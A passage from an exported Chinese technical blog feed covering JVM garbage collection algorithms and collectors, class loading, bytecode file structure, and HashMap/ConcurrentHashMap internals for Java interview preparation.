<p>此外，还有一个<strong>动态对象年龄</strong>，Hotspot 遍历所有对象时，按照年龄从小到大对其所占用的大小进行累积，当累积的某个年龄大小超过了 survivor 区的 50% 时，取这个年龄为新的晋升年龄阈值。</p>
<h3 id="空间分配担保"><a href="#空间分配担保" class="headerlink" title="空间分配担保"></a>空间分配担保</h3><p>JDK 6 Update 24 之后的规则变为只要老年代的连续空间大于新生代对象总大小或者历次晋升的平均大小，就会进行 Minor GC，否则将进行 Full GC。</p>
<h2 id="二-死亡对象判断"><a href="#二-死亡对象判断" class="headerlink" title="二 死亡对象判断"></a>二 死亡对象判断</h2><h3 id="引用计数法"><a href="#引用计数法" class="headerlink" title="引用计数法"></a>引用计数法</h3><p>通过在对象头中分配一个空间来保存该对象被引用的次数（Reference Count）。</p>
<p>如果该对象被其它对象引用，则它的引用计数加 1，如果删除对该对象的引用，那么它的引用计数就减 1，当该对象的引用计数为 0 时，那么该对象就会被回收。</p>
<p>但是该算法无法解决<strong>循环依赖</strong>问题。</p>
<h3 id="可达性分析算法"><a href="#可达性分析算法" class="headerlink" title="可达性分析算法"></a>可达性分析算法</h3><p>通过 GC Roots 作为起点，然后向下搜索，搜索走过的路径被称为 Reference Chain（引用链），当一个对象到 GC Roots 之间没有任何引用相连时，即从 GC Roots 到该对象节点不可达，则证明该对象是需要垃圾收集的。</p>
<p>GC Roots有：</p>
<ul>
<li>虚拟机栈中的引用（方法的参数、局部变量等）</li>
<li>本地方法栈中 JNI 的引用</li>
<li>类静态变量</li>
<li>运行时常量池中的常量（String 或 Class 类型）</li>
<li>所有被同步锁持有的对象</li>
</ul>
<h2 id="三-垃圾收集算法"><a href="#三-垃圾收集算法" class="headerlink" title="三 垃圾收集算法"></a>三 垃圾收集算法</h2><h3 id="标记清除"><a href="#标记清除" class="headerlink" title="标记清除"></a>标记清除</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306184917758.png" alt="image-20250306184917758"></p>
<ol>
<li><strong>效率问题</strong>：标记和清除两个过程效率都不高。</li>
<li><strong>空间问题</strong>：标记清除后会产生大量不连续的内存碎片。</li>
</ol>
<h3 id="复制算法"><a href="#复制算法" class="headerlink" title="复制算法"></a>复制算法</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306185001120.png" alt="image-20250306185001120"></p>
<ol>
<li><p><strong>可用内存变小</strong>：可用内存缩小为原来的一半。</p>
</li>
<li><p><strong>不适合老年代</strong>：如果存活对象数量比较大，复制性能会变得很差。</p>
</li>
</ol>
<h3 id="标记整理"><a href="#标记整理" class="headerlink" title="标记整理"></a>标记整理</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306185036514.png" alt="image-20250306185036514"></p>
<ol>
<li><strong>效率问题</strong>：效率上比复制算法差很多。</li>
</ol>
<h3 id="分代收集算法"><a href="#分代收集算法" class="headerlink" title="分代收集算法"></a>分代收集算法</h3><p>分代收集算法（Generational Collection）严格来说并不是一种思想或理论，而是融合上述 3 种基础的算法思想，而产生的针对不同情况所采用不同算法的一套组合拳。</p>
<p>根据对象存活周期的不同会将内存划分为几块，一般是把 Java 堆分为新生代和老年代，这样就可以根据各个年代的特点采用最适当的收集算法。</p>
<p>比如在新生代中，每次收集都会有大量对象死去，所以可以选择“复制”算法，只需要付出少量对象的复制成本就可以完成每次垃圾收集。而老年代的对象存活几率是比较高的，而且没有额外的空间对它进行分配担保，所以我们必须选择“标记-清除”或“标记-整理”算法进行垃圾收集。</p>
<h2 id="四-垃圾收集器"><a href="#四-垃圾收集器" class="headerlink" title="四 垃圾收集器"></a>四 垃圾收集器</h2><h3 id="Parallel-Scavenge-Parallel-Old"><a href="#Parallel-Scavenge-Parallel-Old" class="headerlink" title="Parallel Scavenge + Parallel Old"></a>Parallel Scavenge + Parallel Old</h3><p>这是JDK1.8及之前的默认垃圾收集器。</p>
<p><strong>Parallel Scavenge 收集器</strong>是使用标记-复制算法的多线程收集器，关注点是<strong>吞吐量</strong>（高效率的利用 CPU）。</p>
<p><strong>Parallel Old 收集器</strong>使用多线程和“标记-整理”算法，Parallel Scavenge 收集器的老年代版本。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306185609063.png" alt="image-20250306185609063"></p>
<h3 id="CMS-（Concurrent-Mark-Sweep）"><a href="#CMS-（Concurrent-Mark-Sweep）" class="headerlink" title="CMS**（Concurrent Mark Sweep）**"></a>CMS**（Concurrent Mark Sweep）**</h3><p><strong>CMS（Concurrent Mark Sweep）垃圾收集器是第一个关注 GC 停顿时间（STW 的时间）的垃圾收集器</strong>。CMS 垃圾回收器在 Java 9 中已经被标记为过时(deprecated)，并在 Java 14 中被移除。</p>
<p>CMS 收集器是一种 <strong>“标记-清除”算法</strong>实现的，运作过程分为四步：</p>
<ol>
<li><p><strong>初始标记：</strong> 短暂停顿，标记直接与 root 相连的对象（根对象）；</p>
</li>
<li><p><strong>并发标记：</strong> 同时开启 GC 和用户线程，用一个闭包结构去记录可达对象。但在这个阶段结束，这个闭包结构并不能保证包含当前所有的可达对象。因为用户线程可能会不断的更新引用域，所以 GC 线程无法保证可达性分析的实时性。所以这个算法里会跟踪记录这些发生引用更新的地方。</p>
</li>
<li><p><strong>重新标记：</strong> 重新标记阶段就是为了修正并发标记期间因为用户程序继续运行而导致标记产生变动的那一部分对象的标记记录，这个阶段的停顿时间一般会比初始标记阶段的时间稍长，远远比并发标记阶段时间短</p>
</li>
<li><p><strong>并发清除：</strong> 开启用户线程，同时 GC 线程开始对未标记的区域做清扫。</p>
</li>
</ol>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306185855829.png" alt="image-20250306185855829"></p>
<p>主要优点：</p>
<ul>
<li><p><strong>并发收集</strong></p>
</li>
<li><p><strong>低停顿</strong></p>
</li>
</ul>
<p>主要缺点：</p>
<ul>
<li><strong>对 CPU 资源敏感；</strong></li>
<li><strong>无法处理浮动垃圾；</strong></li>
<li><strong>它使用的回收算法-“标记-清除”算法会导致收集结束时会有大量空间碎片产生。</strong></li>
</ul>
<h3 id="G1（Garbage-First）"><a href="#G1（Garbage-First）" class="headerlink" title="G1（Garbage First）"></a>G1（Garbage First）</h3><p>**G1 (Garbage-First) 是一款面向服务器的垃圾收集器,主要针对配备多颗处理器及大容量内存的机器. 以极高概率满足 GC 停顿时间要求的同时,还具备高吞吐量性能特征。**G1在Java 7 推出，在Java 9成为默认垃圾回收器。</p>
<p>特点：</p>
<ol>
<li><p><strong>它将堆内存分为多个大小相等的区域（Region）</strong>，每个区域都可以是 Eden 区、Survivor 区或者 Old 区。可以通过 <code>-XX:G1HeapRegionSize=n</code> 来设置 Region 的大小，可以设定为 1M、2M、4M、8M、16M、32M（不能超过）。</p>
<p>G1 有专门分配大对象的 Region 叫 Humongous 区，而不是让大对象直接进入老年代的 Region 中。在 G1 中，大对象的判定规则就是一个大对象超过了一个 Region 大小的 50%，比如每个 Region 是 2M，只要一个对象超过了 1M，就会被放入 Humongous 中，而且一个大对象如果太大，可能会横跨多个 Region 来存放。</p>
<p>G1 会根据各个区域的垃圾回收情况来决定下一次垃圾回收的区域，这样就避免了对整个堆内存进行垃圾回收，从而降低了垃圾回收的时间。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306194140439.png" alt="image-20250306194140439"></p>
</li>
<li><p><strong>增量</strong>：G1 可以以增量方式执行垃圾回收，这意味着它不需要一次性回收整个堆空间，而是可以逐步、增量地清理。有助于控制停顿时间，尤其是在处理大型堆时。</p>
</li>
<li><p><strong>并行</strong>：G1 垃圾回收器可以并行回收垃圾，这意味着它可以利用多个 CPU 来加速垃圾回收的速度，这一特性在年轻代的垃圾回收（Minor GC）中特别明显，因为年轻代的回收通常涉及较多的对象和较高的回收速率。</p>
</li>
<li><p><strong>标记整理</strong>：在进行老年代的垃圾回收时，G1 使用标记-整理算法。这个过程分为两个阶段：标记存活的对象和整理（压缩）堆空间。通过整理，G1 能够避免内存碎片化，提高内存利用率。</p>
</li>
<li><p><strong>可预测的停顿</strong>：这是 G1 相对于 CMS 的另一个大优势，降低停顿时间是 G1 和 CMS 共同的关注点，但 G1 除了追求低停顿外，还能建立可预测的停顿时间模型，能让使用者明确指定在一个长度为 M 毫秒的时间片段内，消耗在垃圾收集上的时间不得超过 N 毫秒。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250306194433342.png" alt="image-20250306194433342"></p>
</li>
</ol>
<h3 id="ZGC"><a href="#ZGC" class="headerlink" title="ZGC"></a>ZGC</h3><p>ZGC（The Z Garbage Collector）是 JDK11 推出的一款低延迟垃圾收集器，适用于大内存低延迟服务的内存管理和回收，停顿时间远胜于 G1 和 CMS。</p>
<p>特点：</p>
<ol>
<li><strong>全并发操作</strong>：几乎所有阶段（标记、转移、重定位）均并发执行，仅需极短 STW（通常 &lt;1ms）。通过 <strong>染色指针（Colored Pointers）</strong> 和 <strong>读屏障（Load Barrier）</strong> 实现并发对象标记与移动。</li>
<li><strong>无分代设计</strong>：基于 Region 的堆布局（动态调整 Region 大小，支持 2MB&#x2F;32MB&#x2F;…），单一代（无 Young&#x2F;Old 代），但通过并发处理实现高效回收。</li>
<li><strong>极短停顿时间</strong>：停顿时间不超过 10ms；停顿时间不会随着堆的大小，或者活跃对象的大小而增加；</li>
<li>最大支持 16TB 的堆内存。</li>
</ol>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM——初识JVM</title>
    <url>/2025/02/01/JVM%E8%AF%A6%E8%A7%A3%E2%80%94%E2%80%94%E5%88%9D%E8%AF%86JVM/</url>
    <content><![CDATA[<h2 id="JVM功能"><a href="#JVM功能" class="headerlink" title="JVM功能"></a>JVM功能</h2><p>JVM（Java Virtual Machine），即Java虚拟机，其职责是运行Java字节码文件。</p>
<p>其功能主要有三个：</p>
<ul>
<li>解释和运行：对字节码文件中的指令，实时的解释成机器码，让计算机执行。</li>
<li>内存管理：自动为对象、方法等分配内存；自动的垃圾回收机制，回收不再使用的对象。</li>
<li>即时编译（JIT）：对热点代码进行优化，提升执行效率。</li>
</ul>
<p>Java需要实时解释，主要是为了支持跨平台特性。即同一份字节码文件在不同的平台上，安装不同的JVM，让JVM解释运行，实现跨平台。</p>
<span id="more"></span>

<h2 id="JVM家族"><a href="#JVM家族" class="headerlink" title="JVM家族"></a>JVM家族</h2><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250221125124871.png" alt="image-20250221125124871"></p>
<h2 id="JVM的组成"><a href="#JVM的组成" class="headerlink" title="JVM的组成"></a>JVM的组成</h2><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250221125406875.png" alt="image-20250221125406875" style="zoom:50%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/what-is-jvm-20231030185742.png" alt="img" style="zoom:67%;" />

<p>类加载器负责将字节码文件加载到内存中，主要会经历加载-&gt;连接-&gt;实例化这三个阶段。</p>
<p>JVM 定义了 Java 程序运行期间需要使用到的内存区域，简单来说，这块内存区域存放了字节码信息以及程序执行过程的数据，垃圾收集器也会针对运行时数据区进行对象回收的工作。</p>
<p>执行引擎的任务就是将字节码指令解释&#x2F;编译为对应平台上的本地机器指令。</p>
<p>JVM 会先通过类加载器加载字节码文件，然后将字节码加载到 JVM 的运行时数据区，再通过执行引擎转化为机器码最终交给操作系统执行。</p>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM——类加载过程</title>
    <url>/2025/02/01/JVM%E8%AF%A6%E8%A7%A3%E2%80%94%E2%80%94%E7%B1%BB%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="一-类的生命周期"><a href="#一-类的生命周期" class="headerlink" title="一 类的生命周期"></a>一 类的生命周期</h2><p>加载-&gt;验证-&gt;准备-&gt;解析-&gt;初始化-&gt;使用-&gt;卸载</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250305165311851.png" alt="image-20250305165311851" style="zoom:50%;" />

<h2 id="二-加载"><a href="#二-加载" class="headerlink" title="二 加载"></a>二 加载</h2><p>类加载过程由类加载器完成。每个 Java 类都有一个引用指向加载它的 <code>ClassLoader</code>。不过，数组类不是通过 <code>ClassLoader</code> 创建的，而是 JVM 在需要的时候自动创建的，数组类通过<code>getClassLoader()</code>方法获取 <code>ClassLoader</code> 的时候和该数组的元素类型的 <code>ClassLoader</code> 是一致的。</p>
<p>加载过程主要完成：</p>
<ol>
<li>通过全类名获取定义此类的二进制字节流。</li>
<li>将字节流所代表的静态存储结构转换为方法区的运行时数据结构。</li>
<li>在内存中生成一个代表该类的 <code>Class</code> 对象，作为方法区这些数据的访问入口。</li>
</ol>
<span id="more"></span>

<h2 id="三-验证"><a href="#三-验证" class="headerlink" title="三 验证"></a>三 验证</h2><p><strong>这一阶段的目的是确保 Class 文件的字节流中包含的信息符合《Java 虚拟机规范》的全部约束要求，保证这些信息被当作代码运行后不会危害虚拟机自身的安全。</strong></p>
<p>不过，验证阶段也不是必须要执行的阶段。如果程序运行的全部代码(包括自己编写的、第三方包中的、从外部加载的、动态生成的等所有代码)都已经被反复使用和验证过，在生产环境的实施阶段就可以考虑使用 <code>-Xverify:none</code> 参数来关闭大部分的类验证措施，以缩短虚拟机类加载的时间</p>
<p>验证阶段主要由四个检验阶段组成：</p>
<ol>
<li>文件格式验证（Class 文件格式检查）<ul>
<li>验证字节流是否符合Class文件格式的规范，例如：</li>
<li>是否以0xCAFEBABE开头</li>
<li>主次版本号是否在当前虚拟机处理范围内</li>
<li>常量池中的常数是否有不被支持的类型</li>
</ul>
</li>
<li>元数据验证（字节码语义检查）<ul>
<li>这个类是否有父类（除Object类以外都有父类）</li>
<li>是否继承了不被允许继承的类</li>
</ul>
</li>
<li>字节码验证（程序语义检查）<ul>
<li>函数的参数类型是否正确</li>
<li>对象的类型转换是否合理</li>
</ul>
</li>
<li>符号引用验证（类的正确性检查)<ul>
<li>该类要使用的其他类、方法、字段是否存在</li>
<li>是否有正确的访问权限</li>
</ul>
</li>
</ol>
<p>文件格式验证这一阶段是基于该类的二进制字节流进行的，主要目的是保证输入的字节流能正确地解析并存储于方法区之内，格式上符合描述一个 Java 类型信息的要求。除了这一阶段之外，其余三个验证阶段都是基于方法区的存储结构上进行的，不会再直接读取、操作字节流了。</p>
<h2 id="四-准备"><a href="#四-准备" class="headerlink" title="四 准备"></a>四 准备</h2><p><strong>准备阶段是正式为类变量分配内存并设置类变量初始值的阶段</strong>，这些内存都将在方法区中分配。</p>
<p>这时候进行内存分配的仅包括类变量（ Class Variables ，即静态变量，被 <code>static</code> 关键字修饰的变量，只与类相关，因此被称为类变量），而不包括实例变量。</p>
<p>这里所设置的初始值”通常情况”下是数据类型默认的零值（如 0、0L、null、false 等），比如我们定义了<code>public static int value=111</code> ，那么 value 变量在准备阶段的初始值就是 0 而不是 111（初始化阶段才会赋值）。特殊情况：比如给 value 变量加上了 final 关键字<code>public static final int value=111</code> ，那么准备阶段 value 的值就被赋值为 111。</p>
<h2 id="五-解析"><a href="#五-解析" class="headerlink" title="五 解析"></a>五 解析</h2><p><strong>解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程。</strong> 解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用限定符 7 类符号引用进行。</p>
<h2 id="六-初始化"><a href="#六-初始化" class="headerlink" title="六 初始化"></a>六 初始化</h2><p><strong>初始化阶段是执行初始化方法 <code>&lt;clinit&gt; ()</code>方法的过程，是类加载的最后一步，这一步 JVM 才开始真正执行类中定义的 Java 程序代码(字节码)。</strong></p>
<p>对于初始化阶段，只有主动去使用类才会初始化类。</p>
<h2 id="七-类卸载"><a href="#七-类卸载" class="headerlink" title="七 类卸载"></a>七 类卸载</h2><p><strong>卸载类即该类的 Class 对象被 GC。</strong></p>
<p>卸载类需要满足 3 个要求:</p>
<ol>
<li>该类的所有的实例对象都已被 GC，也就是说堆不存在该类的实例对象。</li>
<li>该类没有在其他任何地方被引用</li>
<li>该类的类加载器的实例已被 GC。</li>
</ol>
<p>所以，在 JVM 生命周期内，由 jvm 自带的类加载器加载的类是不会被卸载的。但是由我们自定义的类加载器加载的类是可能被卸载的。</p>
<p>只要想通一点就好了，JDK 自带的 <code>BootstrapClassLoader</code>, <code>ExtClassLoader</code>, <code>AppClassLoader</code> 负责加载 JDK 提供的类，所以它们(类加载器的实例)肯定不会被回收。而我们自定义的类加载器的实例是可以被回收的，所以使用我们自定义加载器加载的类是可以被卸载掉的。</p>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM——字节码文件</title>
    <url>/2025/02/01/JVM%E8%AF%A6%E8%A7%A3%E2%80%94%E2%80%94%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="一-字节码文件的组成"><a href="#一-字节码文件的组成" class="headerlink" title="一 字节码文件的组成"></a>一 字节码文件的组成</h2><p>字节码文件由以下几个部分组成：</p>
<ul>
<li><p>基本信息</p>
</li>
<li><p>常量池</p>
</li>
<li><p>访问标识</p>
</li>
<li><p>字段</p>
</li>
<li><p>方法</p>
</li>
<li><p>属性</p>
</li>
</ul>
<h2 id="二-基本信息"><a href="#二-基本信息" class="headerlink" title="二 基本信息"></a>二 基本信息</h2><h3 id="魔数-Magic"><a href="#魔数-Magic" class="headerlink" title="魔数 Magic"></a>魔数 Magic</h3><p>软件使用文件的头几个字节来校验文件的类型，字节码文件的前4个字节为<strong>CAFEBABE</strong>。</p>
<span id="more"></span>

<h3 id="主副版本号"><a href="#主副版本号" class="headerlink" title="主副版本号"></a>主副版本号</h3><p>主副版本号指的是编译字节码文件的JDK版本号，主版本号用来标识大版本，JDK1.0-1.1使用了45.0-45.3，JDK1.2是46之后每升级一个大版本就加1。</p>
<p>1.2版本之后大版本号计算方法为：<strong>主版本号 - 44</strong>。例如主版本号52为JDK8。</p>
<p>版本号的作业主要是判断当前字节码的版本和运行时的JDK是否兼容。</p>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250220180722975.png" alt="image-20250220180722975"></p>
<p>例如上图报错说明，字节码文件为JDK8，但运行时环境为JDK6。</p>
<h2 id="三-常量池"><a href="#三-常量池" class="headerlink" title="三 常量池"></a>三 常量池</h2><p>包含：</p>
<ul>
<li><p>字面量</p>
</li>
<li><p>符号引用</p>
</li>
</ul>
<h2 id="四-访问标志-access-flags"><a href="#四-访问标志-access-flags" class="headerlink" title="四 访问标志 access flags"></a>四 访问标志 access flags</h2><p>两个字节，用来标识该Class是否为public、final、interface、abstract等等。</p>
<h2 id="五-当前类、父类、接口索引集合"><a href="#五-当前类、父类、接口索引集合" class="headerlink" title="五 当前类、父类、接口索引集合"></a>五 当前类、父类、接口索引集合</h2><figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">u<span class="number">2</span>             <span class="keyword">this</span><span class="number">_</span><span class="keyword">class</span>;<span class="comment">//当前类</span></span><br><span class="line">u<span class="number">2</span>             <span class="keyword">super</span><span class="number">_</span><span class="keyword">class</span>;<span class="comment">//父类</span></span><br><span class="line">u<span class="number">2</span>             interfaces<span class="number">_</span>count;<span class="comment">//接口数量</span></span><br><span class="line">u<span class="number">2</span>             interfaces[interfaces<span class="number">_</span>count];<span class="comment">//一个类可以实现多个接口</span></span><br></pre></td></tr></table></figure>

<h2 id="六-字段表集合-Fields"><a href="#六-字段表集合-Fields" class="headerlink" title="六 字段表集合 Fields"></a>六 字段表集合 Fields</h2><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">   u2             fields_count<span class="comment">;//字段数量</span></span><br><span class="line">   field_info     fields[fields_count]<span class="comment">;//一个类会可以有个字段</span></span><br><span class="line">   </span><br><span class="line">  	field_info&#123;</span><br><span class="line">   	u2			access_flags<span class="comment">;</span></span><br><span class="line">   	u2			name_index<span class="comment">;//对常量池的引用，表示的字段的名称</span></span><br><span class="line">   	u2			descriptor_index<span class="comment">;//对常量池的引用，表示字段和方法的描述符；</span></span><br><span class="line">   	u2			attributes_count<span class="comment">;一个字段还会拥有一些额外的属性</span></span><br><span class="line">   	attribute_info	attributes[attributes_count]<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="七-方法表集合-Methods"><a href="#七-方法表集合-Methods" class="headerlink" title="七 方法表集合 Methods"></a>七 方法表集合 Methods</h2><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">   u2             methods_count<span class="comment">;//方法数量</span></span><br><span class="line">   method_info    methods[methods_count]<span class="comment">;//一个类可以有个多个方法</span></span><br><span class="line">   </span><br><span class="line">   method_info&#123;</span><br><span class="line">   	u2			access_flags<span class="comment">;</span></span><br><span class="line">   	u2			name_index<span class="comment">;</span></span><br><span class="line">   	u2			descriptor_index<span class="comment">;</span></span><br><span class="line">   	u2			attributes_count<span class="comment">;</span></span><br><span class="line">   	attribute_info	attributes[attributes_count]<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="八-属性表集合-Attributes"><a href="#八-属性表集合-Attributes" class="headerlink" title="八 属性表集合 Attributes"></a>八 属性表集合 Attributes</h2><p>在 Class 文件，字段表，方法表中都可以携带自己的属性表集合，以用于描述某些场景专有的信息。</p>
]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>JVM</tag>
      </tags>
  </entry>
  <entry>
    <title>Java面经——Java集合</title>
    <url>/2024/12/20/Java%E9%9D%A2%E7%BB%8F%E2%80%94%E2%80%94Java%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h1 id="HashMap详解"><a href="#HashMap详解" class="headerlink" title="HashMap详解"></a>HashMap详解</h1><h2 id="一-映射"><a href="#一-映射" class="headerlink" title="一 映射"></a>一 映射</h2><h3 id="1-hash"><a href="#1-hash" class="headerlink" title="1. hash"></a>1. hash</h3><p>在取模运算之前，先将hashcode进行一次hash。该函数的作用是通过异或将hashcode的高位和低位混合，使得低位的随机性增大，<strong>让数据元素更加均衡的分布，减少碰撞</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-取模"><a href="#2-取模" class="headerlink" title="2. 取模"></a>2. 取模</h3><p>然后进行取模：<strong>hash &amp; (length - 1)</strong></p>
<p>为什么是 <code>&amp;</code> ？： 当length是2的n次方时，hash % length 等于 hash &amp; (length - 1)。</p>
<span id="more"></span>

<h2 id="二-底层实现"><a href="#二-底层实现" class="headerlink" title="二 底层实现"></a>二 底层实现</h2><p><strong>JDK8之前</strong>：数组 + 链表。</p>
<p><strong>JDK8</strong>：数据 + 链表&#x2F;红黑树。当链表长度大于阈值（默认为8）且数组长度不小于64时，会转为红黑树。</p>
<h2 id="三-扩容机制"><a href="#三-扩容机制" class="headerlink" title="三 扩容机制"></a>三 扩容机制</h2><p>hashmap的默认容量capacity为16，当其中的元素数量超过阈值threshold（容量*负载因子）后，会触发扩容。</p>
<p>每次扩容都是原来的容量的两倍，这使得容量始终为2的幂次方（即使通过构造函数指定非 2 的幂值，HashMap 也会自动调整为最近的 2 的幂）。</p>
<p>如果旧容量已经达到 HashMap 支持的最大容量 MAXIMUM_CAPACITY（2^30），就不会扩容，同时将阈值设为 Integer.MAX_VALUE（2^31-1），这样就不会再触发扩容。</p>
<p>如果容量小于16，会自动设为16。</p>
<p>扩容时，会创建一个新数组，将旧数组的每个元素重新计算hash后，填入新数组。</p>
<p>由于hashmap的容量始终为2的幂次方，映射函数为<code>hash &amp; (length - 1)</code>，因此会产生这样一个性质：那么一个元素在扩容被转移时，要么留在原位置（index &#x3D; oldIndex），要么迁移到原位置+旧容量（index &#x3D; oldIndex + oldCap）。在jdk8中，元素转移时利用了这个性质，直接利用 <code>(e.hash &amp; oldCap) == 0</code> 判断（即判断哈希值在旧容量的最高位是否为0），如果成立则index &#x3D; oldIndex，否则index &#x3D; oldIndex + oldCap。</p>
<h2 id="四-线程不安全"><a href="#四-线程不安全" class="headerlink" title="四 线程不安全"></a>四 线程不安全</h2><h3 id="1-并发下扩容死循环（jdk8前）"><a href="#1-并发下扩容死循环（jdk8前）" class="headerlink" title="1. 并发下扩容死循环（jdk8前）"></a>1. 并发下扩容死循环（jdk8前）</h3><p>对于链表中元素的转移，<strong>在jdk8前使用的是头插法</strong>，即假如原来的一个桶中的元素是1-&gt;3-&gt;7，那么转移后结果是7-&gt;3-&gt;1（假如还在一个桶中）。而<strong>jdk8后使用的是尾插法</strong>，这样元素的顺序并不会改变。</p>
<p>在jdk7时，假设初始链表为 <code>Entry1 → Entry2</code>，两个线程同时扩容：</p>
<ol>
<li><strong>线程 1</strong> 迁移 <code>Entry1</code> 到新数组，此时 <code>Entry1.next = null</code>，但<strong>未完成迁移</strong>就被挂起。</li>
<li><strong>线程 2</strong> 完成整个链表的迁移，新链表顺序变为 <code>Entry2 → Entry1</code>（头插法）。</li>
<li><strong>线程 1</strong> 恢复后继续迁移，此时它看到的链表已被线程 2 修改，导致 <code>Entry1.next = Entry2</code>，而 <code>Entry2.next = Entry1</code>，形成环形链表 <code>Entry1 ⇄ Entry2</code>。</li>
</ol>
<h3 id="2-多线程put导致元素丢失"><a href="#2-多线程put导致元素丢失" class="headerlink" title="2. 多线程put导致元素丢失"></a>2. 多线程put导致元素丢失</h3><p>两个线程 1,2 同时进行 put 操作，并且发生了哈希冲突（hash 函数计算出的插入下标是相同的）。</p>
<ol>
<li><p>不同的线程可能在不同的时间片获得 CPU 执行的机会，当前线程 1 执行完哈希冲突判断后，由于时间片耗尽挂起。线程 2 先完成了插入1操作。</p>
</li>
<li><p>随后，线程 1 获得时间片，由于之前已经进行过 hash 碰撞的判断，所有此时会直接进行插入，这就导致线程 2 插入的数据被线程 1 覆盖了。</p>
</li>
</ol>
<p>还有一种情况是这两个线程同时 <code>put</code> 操作导致 <code>size</code> 的值不正确，进而导致数据覆盖的问题：</p>
<ol>
<li>线程 1 执行 <code>if(++size &gt; threshold)</code> 判断时，假设获得 <code>size</code> 的值为 10，由于时间片耗尽挂起。</li>
<li>线程 2 也执行 <code>if(++size &gt; threshold)</code> 判断，获得 <code>size</code> 的值也为 10，并将元素插入到该桶位中，并将 <code>size</code> 的值更新为 11。</li>
<li>随后，线程 1 获得时间片，它也将元素放入桶位中，并将 size 的值更新为 11。</li>
<li>线程 1、2 都执行了一次 <code>put</code> 操作，但是 <code>size</code> 的值只增加了 1，也就导致实际上只有一个元素被添加到了 <code>HashMap</code> 中。</li>
</ol>
<h3 id="3-put-和-get-并发时会导致-get-到-null"><a href="#3-put-和-get-并发时会导致-get-到-null" class="headerlink" title="3. put 和 get 并发时会导致 get 到 null"></a>3. put 和 get 并发时会导致 get 到 null</h3><ol>
<li>线程 1 执行 put 时，因为元素个数超出阈值而导致出现扩容</li>
<li>线程 1 执行完 table &#x3D; newTab </li>
<li>线程 2 此时执行 get，由于元素还没有转移完成，get到null</li>
</ol>
<h1 id="CurrentHashMap详解"><a href="#CurrentHashMap详解" class="headerlink" title="CurrentHashMap详解"></a>CurrentHashMap详解</h1><h2 id="一-底层实现"><a href="#一-底层实现" class="headerlink" title="一 底层实现"></a>一 底层实现</h2><p><strong>JDK1.7</strong>：分段的数组 + 链表。ConcurrentHashMap 对整个桶数组进行了分割分段(Segment，分段锁)，每一把锁只锁容器其中一部分数据，多线程访问容器里不同数据段的数据，就不会存在锁竞争，提高并发访问率。一般分为16段，因此最大并发数为16。</p>
<p><strong>JDK1.8</strong>：Node数组 + 链表&#x2F;红黑树。不再使用段的概念，而是使用 CAS + Synchronized保证并发安全。锁粒度更细，<code>synchronized</code> 只锁定当前链表或红黑二叉树的首节点，这样只要 hash 不冲突，就不会产生并发，就不会影响其他 Node 的读写，效率大幅提升。</p>
<h2 id="二-ConcurrentHashMap-能保证复合操作的原子性吗？"><a href="#二-ConcurrentHashMap-能保证复合操作的原子性吗？" class="headerlink" title="二 ConcurrentHashMap 能保证复合操作的原子性吗？"></a>二 ConcurrentHashMap 能保证复合操作的原子性吗？</h2><p><code>ConcurrentHashMap</code> 是线程安全的，意味着它可以保证多个线程同时对它进行读写操作时，不会出现数据不一致的情况。但是，这并不意味着它可以保证所有的复合操作都是原子性的。</p>
<p>例如先判断某个键是否存在<code>containsKey(key)</code>，然后根据结果进行插入或更新<code>put(key, value)</code>。这种操作在执行过程中可能会被其他线程打断，导致结果不符合预期。</p>
<p><strong>那如何保证 <code>ConcurrentHashMap</code> 复合操作的原子性呢？</strong></p>
